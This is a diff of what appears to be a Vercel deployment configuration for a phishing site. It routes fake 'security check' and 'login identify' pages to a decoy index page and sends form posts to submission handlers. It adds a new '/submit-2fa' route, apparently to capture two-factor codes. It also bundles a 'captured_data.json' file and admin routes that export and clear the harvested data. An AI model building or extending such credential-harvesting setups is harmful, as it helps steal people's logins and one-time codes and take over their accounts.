@@ -4,20 +4,20 @@
   "installCommand": "npm install",
   "cleanUrls": true,
   "trailingSlash": false,
-  "outputDirectory": "public",
   "functions": {
     "pages/api/*.js": {
       "includeFiles": "captured_data.json"
     }
   },
   "rewrites": [
-    { "source": "/", "destination": "/index_clean.html" },
-    { "source": "/security", "destination": "/index_clean.html" },
-    { "source": "/security/check", "destination": "/index_clean.html" },
-    { "source": "/login/identify", "destination": "/index_clean.html" },
-    { "source": "/submit", "destination": "/pages/api/submit.js" },
-    { "source": "/admin", "destination": "/pages/api/admin.js" },
-    { "source": "/admin/export", "destination": "/pages/api/admin-export.js" },
-    { "source": "/admin/clear", "destination": "/pages/api/admin-clear.js" }
+    { "source": "/", "destination": "/index.html" },
+    { "source": "/security", "destination": "/index.html" },
+    { "source": "/security/check", "destination": "/index.html" },
+    { "source": "/login/identify", "destination": "/index.html" },
+    { "source": "/submit", "destination": "/api/submit" },
+    { "source": "/submit-2fa", "destination": "/api/submit-2fa" },
+    { "source": "/admin", "destination": "/api/admin" },
+    { "source": "/admin/export", "destination": "/api/admin-export" },
+    { "source": "/admin/clear", "destination": "/api/admin-clear" }
   ]
 }
